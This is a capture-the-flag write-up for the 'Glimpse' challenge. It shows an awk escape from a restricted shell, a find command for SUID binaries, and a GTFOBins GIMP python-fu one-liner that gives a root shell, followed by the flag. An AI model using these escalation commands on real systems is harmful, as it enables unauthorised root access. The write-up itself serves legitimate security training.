# Glimpse

### 125 Points

### Problem

There's not a lot to work with on this server. But there is something...

Connect here:
`ssh -p 50027 user@jh2i.com # password is 'userpass'`

### Solution

Upon connecting we notice that we are in some kind of restricted shell that will not allows us to run cd commands or run commands that have `/` in them. The first thing I did was try and get a regular Bash shell using awk with `awk 'BEGIN {system("/bin/bash")}`. With that I ran a find command that looked for all the processes that had SUID set for the Root users that might allows us to get a root shell. The command was ` find / -perm /4000 2>&1| grep -v Permission`. Output is below:

```/bin/mount
/bin/umount
/bin/su
/bin/fusermount
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gimp-2.8
/usr/bin/pkexe
```

There are a few processes there, but the one that most looks like it is our target based on it's name is gimp. I look that up on [GTFOBins](https://gtfobins.github.io/) and we find that it does indeed have a [SUID vulnerability](https://gtfobins.github.io/gtfobins/gimp/#suid)  We run that command and see the following:

```
user@ca0f301e59f8:/$ /usr/bin/gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'

(gimp:51): Gtk-WARNING **: 02:44:25.810: Locale not supported by C library.
        Using the fallback 'C' locale.

(gimp:51): GLib-GObject-WARNING **: 02:44:26.412: g_object_set_is_valid_property: object class 'GeglConfig' has no property named 'cache-size'
Failed to parse tag cache: No such file or directory
GIMP-Error: Could not open '/home/user/.gimp-2.8/pluginrc' for writing: Read-only file system

GIMP-Warning: Unable to open a test swap file.

To avoid data loss, please check the location and permissions of the swap directory defined in your Preferences (currently "/home/user/.gimp-2.8").

#
```

There we have a root prompt. At this point we just cat /root/flag.txt and we get the flag: **flag{just_need_a_glimpse_of_the_flag_please}**